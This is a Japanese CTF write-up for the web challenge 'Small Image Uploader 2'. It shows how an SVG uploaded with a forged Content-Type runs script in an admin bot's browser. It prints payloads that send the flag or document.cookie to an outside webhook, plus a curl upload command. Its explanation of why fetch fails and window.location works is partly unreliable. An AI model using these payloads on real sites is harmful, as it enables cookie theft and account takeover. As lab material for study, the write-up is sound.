# Small Image Uploader 2 Writeup
日付: 2026-07-31  
カテゴリ: Web 

---

## 問題概要
Small Image Uploader 2 は、ユーザがアップロードした画像を管理者（Admin Bot）が閲覧するという典型的な「画像アップロード型 XSS」問題である。
- Admin Bot はフラグ入りのCookieを持った状態で、指定されたパスを Headless Chrome で開きます。
- Admin Bot に自分の用意したペイロードを踏ませて、Cookieの内容を外部へ送らせる

### ヒント
- ブラウザはレスポンスの何を見て返ってきた内容の扱いを決めているのでしょうか
- JavaScript を含められることがある XML ベースの画像形式はどの画像形式か


## 試行錯誤
- SVGならXMLベースでスクリプトを挿入できる。
- Webサイトにアップロードできる画像形式はPNG,JPG, GIFのみだが、contenttypeを偽造することでSVGをアップロードできる。
- Webhook.siteにアクセスさせることでCookie内のFlagを取得できるはず
- Fetchを使用してクッキーを取得しようとした
- 以下のプログラムの識別子を許可されているものに変更を行い、WebサイトにアップロードをしてWebhookの出力を確認した。

```XML
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch("/api/flag")
      .then(r => r.text())
      .then(flag => fetch("https://webhooksite.net/AAAAAA/?flag=" + encodeURIComponent(flag)));
  </script>
</svg>
```
- これではXSSが発火しなかった。curl -F で行うとXMLと識別してもらえてアップロードした画像の見た目が変わる

```
curl -F "file=@admin.gif;type=image/svg+xml" http://localhost:3000/api/upload
```
- Webhookでは表示されたが、Flagの値は 404 not Found となっていた。

```
    <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
```
- bot.jsがwebhook.siteにアクセスする前にページが閉じてしまうのが原因だと考えられる

```bot.js
try {
    const page = await browser.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: new URL(APP_URL).hostname,
      path: "/",
    });
    await page.goto(url, { timeout: 5000 });
    await sleep(5000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await browser.close();

  console.log(`End visiting: ${url}`);
};
```
- fetchは非同期なので同期型のwindow.locationを使用するとFlagを取得できる

```
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    window.location = 'https://webhooksite.net/312da37f-a2df-4cf9-89c7-6cb8740b41f5?c=' + encodeURIComponent(document.cookie);
  </script>
</svg>
```
### Content-Type 偽装の理由
- ブラウザは 拡張子ではなく MIME（Content-Type）を優先して解釈する
- そのため、type=image/svg+xml を指定すると、拡張子が .gif のままでも SVG として扱われる
- SVG は XML ベースで <script> を含められるため、画像アップロードを利用した XSS が可能になる

### fetch が失敗する理由
- fetch は 非同期処理であり、/api/flag → レスポンス待ち → flag 抽出 → Webhook.site 送信という一連の処理に時間がかかる
- Admin Bot はページを開いて 5 秒後に強制的に閉じる
- ページが閉じられると 未完了の fetch はすべてキャンセルされる
- 結果として /api/flag が完了せず、Webhook.site に届くのは 404 になる

### window.location が同期で強い理由
- window.location は ブラウザの最優先処理として同期的に即時実行される
- fetch のように待たないため、Admin Bot がページを閉じる前に確実に実行される
- Cookie を送るのではなく、Cookie を URL パラメータに埋め込むため制限を回避できる

## まとめ
Small Image Uploader 2 の本質は以下の通り：
- Content-Type を偽装して SVG を実行させる
- 非同期 fetch は失敗するが、window.location は成功する
- ブラウザの同期遷移の強さを利用する

